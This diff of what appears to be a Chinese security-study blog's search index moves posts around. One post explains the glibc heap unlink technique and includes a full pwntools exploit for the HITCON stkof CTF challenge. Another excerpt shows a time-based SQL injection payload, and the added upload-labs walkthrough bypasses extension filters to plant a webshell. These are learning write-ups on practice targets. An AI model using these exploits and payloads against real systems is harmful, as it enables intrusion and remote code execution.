@@ -340,91 +340,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>unlink漏洞学习</title>
-    <url>/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="堆的unlink漏洞学习"><a class="markdownIt-Anchor" href="#堆的unlink漏洞学习"></a> 堆的unlink漏洞学习</h1>
-<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
-<p>做实验做到的堆部分，第一个就是这个，以前没怎么详细做过堆的题，理解起来真的困难，看了几天才能理解，还是太菜了。就决定要把这个记录下来TAT</p>
-<h2 id="unlink基本原理"><a class="markdownIt-Anchor" href="#unlink基本原理"></a> Unlink基本原理</h2>
-<p>Unlink的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p>
-<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/unlink.png" alt="unlink基本原理" style="zoom:67%;">
-<p>目的是为了把图中的P拿出来，然后使FD-&gt;bk=BK 以及BK-&gt;fd=FD，其实这里说的也已经很清楚<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#_2">CTF wiki unlink</a>，不过我就是不明白unlink的一个检查机制</p>
-<p>双向链表指针破坏：前一个块的 fd 和下一个块的 bk 应该指向当前 unlink</p>
-<p>块。当攻击者使用 free -12 和 shellcode 地址覆</p>
-<p>盖 fd 和 bk 时， free 和 shellcode 地址 + 8 就不会指向当前 unlink 块</p>
-<p>（ second ）。因此 glibc malloc 就抛出双向链表指针破坏错误。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><span class="hljs-built_in">malloc_printerr</span> (check_action, <span class="hljs-string">&quot;corrupted double-linked</span><br><span class="hljs-string">list&quot;</span>, P); <br></code></pre></td></tr></table></figure>
-<p>以及这个机制的绕过，这个机制主要是验证p-&gt; fd-&gt; bk == p 和 p-&gt; bk-&gt; fd == p</p>
-<p>绕过主要是令伪造堆快的fd=这个堆快的指针位置-3*偏移，以及bk=这个堆快的指针位置-2*偏移</p>
-<p>这个看得我真的很绕，一时间理解不能，还是太菜了（还有就是这类题都会有个全局指针？）</p>
-<p>不过做了一道题后理解就很清楚了，果然不能光看。</p>
-<h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof"></a> 2014 HITCON stkof</h2>
-<p>程序开启了canary和堆栈不可执行保护</p>
-<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213154332.png" alt="检查" style="zoom:67%;">                       
-<p>程序运行后没有什么显示，但是根据ida查看可以知道，程序有3个功能</p>
-<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213239564.png" alt="运行" style="zoom:67%;">
-<p>输入1是申请堆块，然后输入大小，这里注意有一个全局变量，每次申请的内存地址都存放在这个全局变量中</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213308210.png" alt="输入1的函数" style="zoom:67%;">
-<p>输入2是编辑堆块，先输入目录号，然后输入长度，再输入内容</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213349366.png" alt="输入2的函数" style="zoom:67%;">
-<p>输入3是进行free的操作</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213416269.png" alt="输入3的操作" style="zoom:67%;">
-<p><strong>注意这里所有操作都是通过全局变量指针s来进行的</strong></p>
-<h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3>
-<ol>
-<li>
-<p>首先创建4个堆块，3号堆块必须不是fastbin，不然不会向前合并，然后在2号堆块伪造chunk，令fd=chunk2的全局变量指针-0x18，bk= chunk2的全局变量指针-0x10</p>
-</li>
-<li>
-<p>在第二个堆块中伪造fake chunk，然后free第三个堆块进行unlink，unlink操作会把伪造堆块的fd写入原来全局变量的chunk2的指针处。</p>
-</li>
-<li>
-<p>这时候修改chunk2，因为chunk2的指针是就等于修改chunk2的全局变量指针-0x18处的值。</p>
-</li>
-<li>
-<p>编辑chunk2（也就是chunk2的全局变量指针-0x18）开始编辑，把free的got表覆盖全局变量的chunk1指针处，然后通过编辑功能修改chunk1指针（也就是free的got表）为put的plt表，然后free掉chunk2，就可以泄露处put的真实地址，然后计算system和bin/sh的真实地址</p>
-</li>
-<li>
-<p>最后把free的got表覆盖为system的地址，然后编辑chunk4中为/bin/sh的地址，然后free掉chunk4，触发system（/bin/sh）即可完成利用</p>
-</li>
-</ol>
-<h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3>
-<p>首先创建4个堆块，大小分别为0x20，0x30，0x80，0x20，堆块3不能是fastbin，否则不能触发合并。</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213459651.png" alt="创建堆快" style="zoom:67%;">
-<p>查看全局变量s的位置，4个堆块的指针都记录在上面</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213531336.png" alt="全局变量查看" style="zoom:67%;">
-<p>然后修改chunk2伪造堆块</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213556648.png" alt="伪造的chunk2" style="zoom:67%;">
-<p>0是伪造堆块的prev_size，0x30是size</p>
-<p>0x602138是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在伪造堆块的fd位置</p>
-<p>0x602140是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在位置堆块的bk位置</p>
-<p>然后覆盖chunk3的prev_size为0x30，size为0x90，让系统以为伪造的堆块处于空闲状态</p>
-<p>进行free（3）的操作后，判断伪造的chunk2是处于空闲状态，然后判断</p>
-<p>p-&gt; fd-&gt; bk = = p 和 p-&gt; bk-&gt; fd ==p，这里p-&gt; fd=0x602138，然后从0x602138取4个地址偏移的位置（看成一个0x602138起始的堆块取bk），刚刚好是全局指针0x602150=&gt;0x2846460=p，验证通过，然后p-&gt; bk-&gt; fd ==p的过程同上。</p>
-<p>然后进行unlink操作</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++">FD = p-&gt;fd;<br>BK = p-&gt;bk;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>
-<p>这里FD-&gt;bk和BK-&gt;fd都是chunk2在全局变量指针中的地址，最后会进行BK-&gt;fd = FD，把伪造chunk2的FD复制到chunk2全局变量指针的位置，结果如下</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213704244.png" alt="最后进行的BK->fd操作" style="zoom:67%;">
-<p>可以看到0x602150（原来chunk2的指针位置）被覆盖成了伪造chunk2的FD（0x602138）</p>
-<p>然后进行修改chunk2的操作（先从全局变量取指针0x602150-&gt;0x602138），然后就可以修改0x602138的位置的内容，这时把chunk1的全局变量指针改为free的got表地址，chunk2的全局变量指针改为put的plt表地址（用于put出put函数真实地址）</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213750481.png" alt="编辑chunk1" style="zoom:67%;">
-<p>这里0x602148和0x602150已经被修改为free_got和put_plt</p>
-<p>然后进行修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址</p>
-<p>进行free（2）的操作，实际上是put出put_plt泄露出真实地址</p>
- <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213836064.png" alt="泄露的put真实地址" style="zoom:67%;">
-<p>后续操作就是计算system已经/bin/sh的地址了，最后同上修改free的got表地址为system的地址，修改chunk4为/bin/sh，进行free（4）的操作就可以了。</p>
-<p>脚本如下，参考了https://bbs.pediy.com/thread-247007.htm</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br> <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>,os = <span class="hljs-string">&quot;linux&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malloc</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,strings</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    p.send(strings)<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x30</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#创建4个堆快，第三个用来free的堆快不能是fastbin</span><br><br>target = <span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span><br>fd = target - <span class="hljs-number">0x18</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#伪造堆块的prev_size</span><br>payload += p64(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#伪造堆块的size</span><br>payload += p64(fd) + p64(bk)<br>payload += <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span><br>payload += p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x90</span>)  <span class="hljs-comment">#更改chunk3的标志位，会认为前一个堆快是空闲的触发unlink</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>free(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br> <br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span> <br>payload2 += p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload2)<br><br>payload3 = p64(puts_plt)<br>edit(<span class="hljs-number">1</span>,payload3)<br><span class="hljs-comment">#修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址 </span><br>free(<span class="hljs-number">2</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\nOK\n&quot;</span>,drop = <span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>puts_offset = libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_offset = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binp_offset = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br> <br>libc_base = puts_addr - puts_offset<br> <br>system_addr = libc_base + system_offset<br> <br>payload4 = p64(system_addr)<br><br>edit(<span class="hljs-number">1</span>,payload4)<br><span class="hljs-comment">#再次修改chunk1，把free_got修改为system的地址</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>PWN学习</category>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>PWN学习</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli labs master 学习</title>
     <url>/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="sqli-labs-master-学习"><a class="markdownIt-Anchor" href="#sqli-labs-master-学习"></a> sqli labs master 学习</h1>
@@ -582,6 +497,180 @@
 <h2 id="less-10"><a class="markdownIt-Anchor" href="#less-10"></a> Less 10</h2>
 <p>这里和上一关一样，不管输入什么都会显示you are in….，通过测试，当输入?id=1&quot; and sleep(5) – -时，延迟明显，说明存在双引号注入</p>
 <p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image123022.jpg" alt="img"></p>
+]]></content>
+      <categories>
+        <category>web学习</category>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>web学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>unlink漏洞学习</title>
+    <url>/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="堆的unlink漏洞学习"><a class="markdownIt-Anchor" href="#堆的unlink漏洞学习"></a> 堆的unlink漏洞学习</h1>
+<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
+<p>做实验做到的堆部分，第一个就是这个，以前没怎么详细做过堆的题，理解起来真的困难，看了几天才能理解，还是太菜了。就决定要把这个记录下来TAT</p>
+<h2 id="unlink基本原理"><a class="markdownIt-Anchor" href="#unlink基本原理"></a> Unlink基本原理</h2>
+<p>Unlink的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p>
+<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/unlink.png" alt="unlink基本原理" style="zoom:67%;">
+<p>目的是为了把图中的P拿出来，然后使FD-&gt;bk=BK 以及BK-&gt;fd=FD，其实这里说的也已经很清楚<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#_2">CTF wiki unlink</a>，不过我就是不明白unlink的一个检查机制</p>
+<p>双向链表指针破坏：前一个块的 fd 和下一个块的 bk 应该指向当前 unlink</p>
+<p>块。当攻击者使用 free -12 和 shellcode 地址覆</p>
+<p>盖 fd 和 bk 时， free 和 shellcode 地址 + 8 就不会指向当前 unlink 块</p>
+<p>（ second ）。因此 glibc malloc 就抛出双向链表指针破坏错误。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><span class="hljs-built_in">malloc_printerr</span> (check_action, <span class="hljs-string">&quot;corrupted double-linked</span><br><span class="hljs-string">list&quot;</span>, P); <br></code></pre></td></tr></table></figure>
+<p>以及这个机制的绕过，这个机制主要是验证p-&gt; fd-&gt; bk == p 和 p-&gt; bk-&gt; fd == p</p>
+<p>绕过主要是令伪造堆快的fd=这个堆快的指针位置-3*偏移，以及bk=这个堆快的指针位置-2*偏移</p>
+<p>这个看得我真的很绕，一时间理解不能，还是太菜了（还有就是这类题都会有个全局指针？）</p>
+<p>不过做了一道题后理解就很清楚了，果然不能光看。</p>
+<h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof"></a> 2014 HITCON stkof</h2>
+<p>程序开启了canary和堆栈不可执行保护</p>
+<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213154332.png" alt="检查" style="zoom:67%;">                       
+<p>程序运行后没有什么显示，但是根据ida查看可以知道，程序有3个功能</p>
+<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213239564.png" alt="运行" style="zoom:67%;">
+<p>输入1是申请堆块，然后输入大小，这里注意有一个全局变量，每次申请的内存地址都存放在这个全局变量中</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213308210.png" alt="输入1的函数" style="zoom:67%;">
+<p>输入2是编辑堆块，先输入目录号，然后输入长度，再输入内容</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213349366.png" alt="输入2的函数" style="zoom:67%;">
+<p>输入3是进行free的操作</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213416269.png" alt="输入3的操作" style="zoom:67%;">
+<p><strong>注意这里所有操作都是通过全局变量指针s来进行的</strong></p>
+<h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3>
+<ol>
+<li>
+<p>首先创建4个堆块，3号堆块必须不是fastbin，不然不会向前合并，然后在2号堆块伪造chunk，令fd=chunk2的全局变量指针-0x18，bk= chunk2的全局变量指针-0x10</p>
+</li>
+<li>
+<p>在第二个堆块中伪造fake chunk，然后free第三个堆块进行unlink，unlink操作会把伪造堆块的fd写入原来全局变量的chunk2的指针处。</p>
+</li>
+<li>
+<p>这时候修改chunk2，因为chunk2的指针是就等于修改chunk2的全局变量指针-0x18处的值。</p>
+</li>
+<li>
+<p>编辑chunk2（也就是chunk2的全局变量指针-0x18）开始编辑，把free的got表覆盖全局变量的chunk1指针处，然后通过编辑功能修改chunk1指针（也就是free的got表）为put的plt表，然后free掉chunk2，就可以泄露处put的真实地址，然后计算system和bin/sh的真实地址</p>
+</li>
+<li>
+<p>最后把free的got表覆盖为system的地址，然后编辑chunk4中为/bin/sh的地址，然后free掉chunk4，触发system（/bin/sh）即可完成利用</p>
+</li>
+</ol>
+<h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3>
+<p>首先创建4个堆块，大小分别为0x20，0x30，0x80，0x20，堆块3不能是fastbin，否则不能触发合并。</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213459651.png" alt="创建堆快" style="zoom:67%;">
+<p>查看全局变量s的位置，4个堆块的指针都记录在上面</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213531336.png" alt="全局变量查看" style="zoom:67%;">
+<p>然后修改chunk2伪造堆块</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213556648.png" alt="伪造的chunk2" style="zoom:67%;">
+<p>0是伪造堆块的prev_size，0x30是size</p>
+<p>0x602138是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在伪造堆块的fd位置</p>
+<p>0x602140是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在位置堆块的bk位置</p>
+<p>然后覆盖chunk3的prev_size为0x30，size为0x90，让系统以为伪造的堆块处于空闲状态</p>
+<p>进行free（3）的操作后，判断伪造的chunk2是处于空闲状态，然后判断</p>
+<p>p-&gt; fd-&gt; bk = = p 和 p-&gt; bk-&gt; fd ==p，这里p-&gt; fd=0x602138，然后从0x602138取4个地址偏移的位置（看成一个0x602138起始的堆块取bk），刚刚好是全局指针0x602150=&gt;0x2846460=p，验证通过，然后p-&gt; bk-&gt; fd ==p的过程同上。</p>
+<p>然后进行unlink操作</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++">FD = p-&gt;fd;<br>BK = p-&gt;bk;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>
+<p>这里FD-&gt;bk和BK-&gt;fd都是chunk2在全局变量指针中的地址，最后会进行BK-&gt;fd = FD，把伪造chunk2的FD复制到chunk2全局变量指针的位置，结果如下</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213704244.png" alt="最后进行的BK->fd操作" style="zoom:67%;">
+<p>可以看到0x602150（原来chunk2的指针位置）被覆盖成了伪造chunk2的FD（0x602138）</p>
+<p>然后进行修改chunk2的操作（先从全局变量取指针0x602150-&gt;0x602138），然后就可以修改0x602138的位置的内容，这时把chunk1的全局变量指针改为free的got表地址，chunk2的全局变量指针改为put的plt表地址（用于put出put函数真实地址）</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213750481.png" alt="编辑chunk1" style="zoom:67%;">
+<p>这里0x602148和0x602150已经被修改为free_got和put_plt</p>
+<p>然后进行修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址</p>
+<p>进行free（2）的操作，实际上是put出put_plt泄露出真实地址</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213836064.png" alt="泄露的put真实地址" style="zoom:67%;">
+<p>后续操作就是计算system已经/bin/sh的地址了，最后同上修改free的got表地址为system的地址，修改chunk4为/bin/sh，进行free（4）的操作就可以了。</p>
+<p>脚本如下，参考了https://bbs.pediy.com/thread-247007.htm</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br> <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>,os = <span class="hljs-string">&quot;linux&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malloc</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,strings</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    p.send(strings)<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x30</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#创建4个堆快，第三个用来free的堆快不能是fastbin</span><br><br>target = <span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span><br>fd = target - <span class="hljs-number">0x18</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#伪造堆块的prev_size</span><br>payload += p64(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#伪造堆块的size</span><br>payload += p64(fd) + p64(bk)<br>payload += <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span><br>payload += p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x90</span>)  <span class="hljs-comment">#更改chunk3的标志位，会认为前一个堆快是空闲的触发unlink</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>free(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br> <br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span> <br>payload2 += p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload2)<br><br>payload3 = p64(puts_plt)<br>edit(<span class="hljs-number">1</span>,payload3)<br><span class="hljs-comment">#修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址 </span><br>free(<span class="hljs-number">2</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\nOK\n&quot;</span>,drop = <span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>puts_offset = libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_offset = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binp_offset = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br> <br>libc_base = puts_addr - puts_offset<br> <br>system_addr = libc_base + system_offset<br> <br>payload4 = p64(system_addr)<br><br>edit(<span class="hljs-number">1</span>,payload4)<br><span class="hljs-comment">#再次修改chunk1，把free_got修改为system的地址</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>PWN学习</category>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>PWN学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>upload-labs 学习</title>
+    <url>/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="upload-labs-学习"><a class="markdownIt-Anchor" href="#upload-labs-学习"></a> upload-labs 学习</h1>
+<h2 id="pass-1"><a class="markdownIt-Anchor" href="#pass-1"></a> Pass-1</h2>
+<p>直接上传webshell，发现报错，提示只能上传.jpg|.png|.gif类型的文件。</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image002.jpg" alt="img"></p>
+<p>先把webshell的后缀改成jpg，然后上传，使用Burp抓包</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image004.jpg" alt="img"></p>
+<p>圈住的地方是上传的文件名字，改成1.php，然后发送</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image006.jpg" alt="img"></p>
+<p>可以看到成功上传了</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image008.jpg" alt="img"></p>
+<p>使用菜刀可以成功连接</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image010.jpg" alt="img"></p>
+<h2 id="pass-2"><a class="markdownIt-Anchor" href="#pass-2"></a> Pass-2</h2>
+<p>同样的方法，先把webshell的后缀改成jpg，然后抓包上传</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image012.jpg" alt="img"></p>
+<p>这次把名字改成2.php，方便区分</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image014.jpg" alt="img"></p>
+<p>菜刀连接成功</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image016.jpg" alt="img"></p>
+<h2 id="pass-3"><a class="markdownIt-Anchor" href="#pass-3"></a> Pass-3</h2>
+<p>这里发现使用上面方法已经不行了，上传之后会被提示不允许上传asp，aspx，php，jsp后缀文件，应该是黑名单过滤</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image018.jpg" alt="img"></p>
+<p>关于Apache服务器的一些绕过知识：</p>
+<p>可以上传例如php3, phtml后缀的文件绕过，前提是Apache的httpd.conf中配置有如下代码:</p>
+<p>AddType application/x-httpd-php .php .php3 .phtml</p>
+<p>服务器会将.php3, .phtml后缀的文件当成.php解析</p>
+<p>所以尝试上传.php3的文件</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image020.jpg" alt="img"></p>
+<p>可以看到成功上传了</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image022.jpg" alt="img"></p>
+<p>不过这里会被重命名</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image024.jpg" alt="img"></p>
+<p>用菜刀能连接上</p>
+<p><img src="/2021/05/13/upload-labs-%E5%AD%A6%E4%B9%A0/clip_image026.jpg" alt="img"></p>
